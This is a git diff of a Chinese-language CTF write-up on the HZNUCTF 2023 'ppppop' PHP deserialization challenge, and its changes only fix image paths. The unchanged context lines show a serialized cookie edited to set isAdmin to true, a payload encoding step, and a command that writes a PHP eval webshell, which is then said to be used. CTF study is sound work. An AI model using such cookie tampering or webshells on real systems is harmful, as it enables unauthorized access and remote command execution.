@@ -31,7 +31,7 @@ O:4:"User":1:{s:7:"isAdmin";b:0;}
 
 尝试将 `b:0` 修改为 `b:1`，重新序列化并进行 Base64 编码，将修改后的内容作为 Cookie 发送，成功获得后续页面
 
-![1794963535494]([HZNUCTF 2023 preliminary]ppppop/1794963535494.png)
+![1794963535494](HZNUCTF2023_ppppop/1794963535494.png)
 
 ### 第二轮：获取源码
 
@@ -139,7 +139,7 @@ echo base64_encode(strrev(serialize($a)));
 
 成功获得 FLAG
 
-![image-20261118091029412]([HZNUCTF 2023 preliminary]ppppop/image-20261118091029412.png)
+![image-20261118091029412](HZNUCTF2023_ppppop/image-20261118091029412.png)
 
 ### 2. 尝试写入 WebShell
 
@@ -236,7 +236,7 @@ $a->args = "echo '<?php @eval(\$_POST[\"cmd\"]); ?>' > shell.php";
 
 访问写入的 WebShell，通过 POST 参数 `cmd` 执行命令，成功连接
 
-![1794965316034]([HZNUCTF 2023 preliminary]ppppop/1794965316034.png)
+![1794965316034](HZNUCTF2023_ppppop/1794965316034.png)
 
 ## 四、反思与总结
 
